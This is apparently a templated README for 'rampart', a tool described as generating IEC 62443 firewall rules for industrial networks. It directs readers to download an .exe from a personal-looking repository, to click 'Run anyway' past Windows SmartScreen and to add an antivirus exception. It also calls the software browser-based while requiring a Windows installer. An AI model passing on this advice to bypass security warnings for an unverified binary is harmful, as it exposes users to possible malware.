---
layout: "default"
title: "🛡️ rampart - Create secure network rules for industry"
description: "Define OT zones to generate automated firewall policies based on IEC 62443 and Purdue model requirements."
---
# 🛡️ rampart - Create secure network rules for industry

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/kerriesingle633/rampart)

## About the software

Rampart helps you secure your industrial network. You describe your operational technology zones and the application generates a security policy. You receive ready-to-use rules for your firewall. This tool supports common hardware like Palo Alto, FortiGate, Juniper, and Cisco ASA. It also creates rules for standard Linux systems. You can import your current device inventory and export diagrams or documents. The software runs in your web browser.

## 💻 System requirements

Your computer must run Windows 10 or Windows 11. You need at least 4 gigabytes of memory. Your hard drive should have 500 megabytes of free space. A modern web browser like Microsoft Edge, Google Chrome, or Mozilla Firefox is necessary to view the interface. An internet connection is not required once you download the application.

## 📥 Downloading the software

You download the software from the official repository page. Follow these steps to get the file:

1. Visit the following link: [https://github.com/kerriesingle633/rampart](https://github.com/kerriesingle633/rampart)
2. Locate the section labeled Releases on the right side of the page.
3. Click the version number to open the release details.
4. Select the Windows installer file ending in .exe.
5. Save the file to your computer.

## ⚙️ Installation steps

After you download the file, take these steps to install the tool:

1. Open your Downloads folder.
2. Double-click the file you downloaded.
3. Your computer may show a security window. Click More Info and then click Run anyway if Windows protects your PC.
4. Follow the instructions on the screen to finish the setup.
5. Launch the application from your desktop shortcut or the Start menu.

## 🏗️ Using the dashboard

The interface organizes your network into segments based on the Purdue model. You start by adding your assets. You define the type of device and its function. Once you list your inventory, the software maps the traffic paths. You select the security requirements for each zone. The tool calculates how to isolate specific parts of your network.

## 📝 Creating your policy

You generate your security policy after you finish mapping your zones. Click the Export button to see the available formats. You can choose the specific brand of firewall you use in your facility. The tool writes the commands for you. You copy these commands into your security device to enforce the rules. The system defaults to a deny-all state. This ensures that no traffic moves unless you specifically permit it.

## 📊 Visualizing your network

The software creates a map of your connections. This diagram shows how your zones interact. You can save this map as an image file. Use this for your internal reports or during maintenance. It helps your team understand the structure of the industrial systems. You can update the map whenever you add new equipment or change your network layout.

## 🔒 Security standards

Rampart uses the IEC 62443 standard as its foundation. This ensures your network follows industry best practices for security. You divide your system into logically separate zones. This limits the impact if an incident occurs in one part of the plant. The software automates the complex task of writing firewall rules. It reduces the chance of errors during configuration.

## 🛠️ Frequently asked questions

Does this software change my firewall settings? No. It generates text files with commands. You must copy these commands into your firewall manually. You maintain full control over your equipment at all times.

Can I save my work? Yes. You can save your project files to your hard drive. Open these files later to make changes as your network grows.

Does this send data to the internet? No. The application works entirely on your local machine. Your infrastructure data remains private.

What if my firewall is not on the list? You can use the generic iptables or raw text format. These provide standard syntax that many devices understand.

## 📦 Troubleshooting

If the application does not open, check if your antivirus software blocked it. Add an exception for the rampart folder. Ensure you have the latest updates for your Windows system. If the map does not display, clear your browser cache and restart the application. For further help, review the documentation folder located inside the installation directory. 

Keywords: critical-infrastructure, cybersecurity, firewall, fortigate, ics-security, iec-62443, network-segmentation, ot-security, palo-alto, purdue-model, scada